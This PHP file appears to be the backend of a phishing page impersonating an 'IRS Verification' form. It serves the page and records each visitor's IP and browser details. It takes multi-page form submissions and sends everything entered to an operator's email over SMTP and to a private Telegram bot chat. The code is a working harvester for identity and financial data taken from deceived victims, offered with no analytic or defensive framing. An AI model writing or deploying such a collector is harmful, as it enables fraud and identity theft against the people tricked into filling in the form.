<?php
// Enable error reporting for debugging (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 0);

// PHPMailer use statements
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load environment variables
function loadEnv($filePath) {
    if (!file_exists($filePath)) {
        return false;
    }

    $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) {
            continue; // Skip comments
        }

        list($name, $value) = explode('=', $line, 2);
        $name = trim($name);
        $value = trim($value);

        if (!array_key_exists($name, $_ENV)) {
            $_ENV[$name] = $value;
            putenv("$name=$value");
        }
    }
    return true;
}

// Load environment variables
loadEnv(__DIR__ . '/.env');

// Get configuration from environment
$admin_email = getenv('ADMIN_EMAIL') ?: "admin@yourdomain.com";
$smtp_host = getenv('SMTP_HOST') ?: "smtp.gmail.com";
$smtp_username = getenv('SMTP_USERNAME') ?: "your_email@gmail.com";
$smtp_password = getenv('SMTP_PASSWORD') ?: "your_app_password";
$smtp_port = getenv('SMTP_PORT') ?: 587;
$smtp_encryption = getenv('SMTP_ENCRYPTION') ?: "tls";

// Telegram credentials (if needed)
$telegram_token = getenv('TELEGRAM_BOT_TOKEN') ?: '';
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: '';

// Allow CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Handle GET requests by serving the HTML content
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Serve the HTML file content
    $html_file = __DIR__ . '/index.html';
    if (file_exists($html_file)) {
        header('Content-Type: text/html');
        readfile($html_file);
        exit();
    } else {
        http_response_code(404);
        echo "HTML file not found";
        exit();
    }
}

// Only allow POST requests for form processing
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit();
}

// Get JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Invalid JSON data']);
    exit();
}

// Determine if this is form data or tracking data
$is_tracking = isset($data['userAgent']); // Tracking data has userAgent field

if ($is_tracking) {
    // Process visitor tracking data
    $subject = "New Visitor on IRS Verification Form";
    $message = "Visitor Tracking Details:\n\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";

    foreach ($data as $key => $value) {
        $message .= "$key: $value\n";
    }
} else {
    // Process form submission data
    $page_number = isset($data['page_number']) ? $data['page_number'] : 'Unknown';
    $form_data = isset($data['form_data']) ? $data['form_data'] : [];

    if (empty($form_data)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'No form data received']);
        exit();
    }

    $subject = "New IRS Verification Submission (Page $page_number)";
    $message = "New IRS Verification Submission Details:\n\n";
    $message .= "Page: $page_number\n";
    $message .= "Submission Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n\n";

    foreach ($form_data as $key => $value) {
        $message .= "$key: $value\n";
    }
}

// Try to use PHPMailer if available
$phpmailer_path = __DIR__ . '/PHPMailer/src/';
$email_sent = false;

if (file_exists($phpmailer_path . 'PHPMailer.php')) {
    require $phpmailer_path . 'PHPMailer.php';
    require $phpmailer_path . 'SMTP.php';
    require $phpmailer_path . 'Exception.php';

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp_host;
        $mail->SMTPAuth = true;
        $mail->Username = $smtp_username;
        $mail->Password = $smtp_password;
        $mail->SMTPSecure = $smtp_encryption;
        $mail->Port = $smtp_port;

        // Recipients
        $mail->setFrom($smtp_username, 'IRS Form Submission');
        $mail->addAddress($admin_email);

        // Content
        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body = $message;

        $mail->send();
        $email_sent = true;
    } catch (Exception $e) {
        $email_sent = false;
        error_log("PHPMailer Error: " . $mail->ErrorInfo);
    }
} else {
    // Skip basic mail function if no sendmail available, just log the data
    error_log("Form submission data: " . $message);
    $email_sent = true; // Consider it successful since we're logging the data
}

// Also send to Telegram if credentials are available and it's form data (not tracking)
if (!$is_tracking && !empty($telegram_token) && !empty($telegram_chat_id)) {
    $telegram_message = "🚨 *New IRS Verification Submission* 🚨\n\n";

    foreach ($data['form_data'] as $key => $value) {
        if ($value) {
            $telegram_message .= "*$key:* $value\n";
        }
    }

    $url = "https://api.telegram.org/bot{$telegram_token}/sendMessage";

    // Send to Telegram in background without waiting for response
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $telegram_chat_id,
        'text' => $telegram_message,
        'parse_mode' => 'Markdown'
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1); // 1 second timeout
    curl_exec($ch);
    curl_close($ch);
}

// Return response
if ($email_sent) {
    http_response_code(200);
    echo json_encode(['success' => true, 'message' => 'Data processed successfully']);
} else {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Failed to process data. Please check server configuration.']);
}
?>